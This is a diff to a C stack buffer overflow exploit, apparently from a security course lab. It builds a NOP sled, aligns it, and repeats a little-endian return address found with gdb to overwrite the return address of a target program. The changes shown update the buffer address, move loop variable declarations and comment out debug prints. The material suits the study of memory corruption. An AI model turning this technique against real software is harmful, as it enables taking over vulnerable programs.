@@ -16,15 +16,16 @@ main ( int argc, char * argv[] )
 	args[0] = TARGET;
         /* \x90 is NOP for intel x86 processor */
         /*
-          By inspecting the runtime target with gdb we find that the return  of lab_main
-          is \x20\x21\xff\x28 (0x2021ff28) while &buf is located at 0x2021feb0
+          By inspecting the runtime target with gdb we find that 
+          &buf is located at 2021fe10
           120(0x78) character is needed to overflow the return address
          */
         /*  */
         char exploit_str[256];
         // Padding number of nop at the begging of buffer
         strcpy(exploit_str, nop);
-        for (int i = 0; i < NOP_NUM - 1; i++) {
+	int i;
+        for (i = 0; i < NOP_NUM - 1; i++) {
             strcat(exploit_str, nop);
         }
 
@@ -36,19 +37,20 @@ main ( int argc, char * argv[] )
         int exlen = strlen(exploit_str);
         int align = (exlen + 1) % 4;
         if (align != 0) {
-            for (int i = 0; i < align + 1; i++) {
+            for (i = 0; i < align + 1; i++) {
                 strcat(exploit_str, nop);
             }
         }
 
         // appending return addrs
         while (strlen(exploit_str) <= 120) {
-            strcat(exploit_str, "\xb0\xfe\x21\x20"); // Little endian
+            strcat(exploit_str, "\x10\xfe\x21\x20"); // Little endian
         }
  
 	args[1] = exploit_str;
-        printf("args[1] length %lu\n", strlen(args[1]));
-        printf("%s \n", exploit_str);
+	/* Debug log */
+        /* printf("args[1] length %lu\n", strlen(args[1])); */
+        /* printf("%s \n", exploit_str); */
  	args[2] = NULL;
 
 	env[0] = NULL;
